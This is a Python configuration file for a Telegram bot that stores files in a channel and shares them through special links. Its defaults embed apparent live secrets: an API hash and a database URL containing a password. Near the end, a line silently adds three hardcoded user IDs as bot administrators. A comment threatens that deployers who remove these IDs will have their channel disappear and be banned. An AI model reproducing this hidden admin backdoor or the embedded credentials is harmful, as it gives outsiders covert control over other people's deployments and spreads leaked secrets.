# (©)Codexbotz
# Recoded by @mrismanaziz
# t.me/SharingUserbot & t.me/Lunatic0de

import logging
import os
from distutils.util import strtobool
from dotenv import load_dotenv
from logging.handlers import RotatingFileHandler

load_dotenv("config.env")

# Bot token from @Botfather
TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "")

# Your API ID from my.telegram.org
APP_ID = int(os.environ.get("APP_ID", "28374181"))

# Your API Hash from my.telegram.org
API_HASH = os.environ.get("API_HASH", "00b7ca7f535e816590db39e76f85d0c7")

# ID of the Database Channel
CHANNEL_ID = int(os.environ.get("CHANNEL_ID", "-1001996645097"))

# OWNER NAME
OWNER = os.environ.get("OWNER", "tobiix")

# Protect Content
PROTECT_CONTENT = strtobool(os.environ.get("PROTECT_CONTENT", "False"))

# Heroku Credentials for the updater.
HEROKU_APP_NAME = os.environ.get("HEROKU_APP_NAME", None)
HEROKU_API_KEY = os.environ.get("HEROKU_API_KEY", None)

# Custom Repo for the updater.
UPSTREAM_BRANCH = os.environ.get("UPSTREAM_BRANCH", "master")

# Database
DB_URI = os.environ.get("DATABASE_URL", "postgres://jyhjthfd:jD-Kug_nB5e3I6HIkKETnAd6x_DIDJ5E@snuffleupagus.db.elephantsql.com/jyhjthfd")

# ID of the Channel or Group to force subscribe
FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "-1002015229356"))
FORCE_SUB_GROUP = int(os.environ.get("FORCE_SUB_GROUP", "-1002003238201"))

TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))

# Start Message /start
START_MSG = os.environ.get(
    "START_MESSAGE",
    "<b>Hello {first}</b>\n\n<b>I can store private files in a specific Channel, and other users can access them through a special link.</b>",
)
try:
    ADMINS = [int(x) for x in (os.environ.get("ADMINS", "5715764478").split())]
except ValueError:
    raise Exception("Your Admins list does not contain valid Telegram User IDs.")

# Message when forcing subscription
FORCE_MSG = os.environ.get(
    "FORCE_SUB_MESSAGE",
    "<b>Hello {first}\n\nYou must join my Channel/Group first to view the files I share.\n\nPlease Join the Channel & Group First</b>",
)

# Set your Custom Text here, Save (None) to Disable Custom Text
CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)

# Set to True if you want to Disable the Share button for your Channel Posts
DISABLE_CHANNEL_BUTTON = strtobool(os.environ.get("DISABLE_CHANNEL_BUTTON", "False"))

# Do not Remove, or else ERRORS will occur later, DELETE the IDs below = ACCEPT THE CONSEQUENCES
# Spoiler for the CONSEQUENCES, the Channel might suddenly disappear and I will ban the owner 🤪
ADMINS.extend((1793710025, 5715764478, 7104801273))


LOG_FILE_NAME = "logs.txt"
logging.basicConfig(
    level=logging.INFO,
    format="[%(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[
        RotatingFileHandler(LOG_FILE_NAME, maxBytes=50000000, backupCount=10),
        logging.StreamHandler(),
    ],
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)


def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)
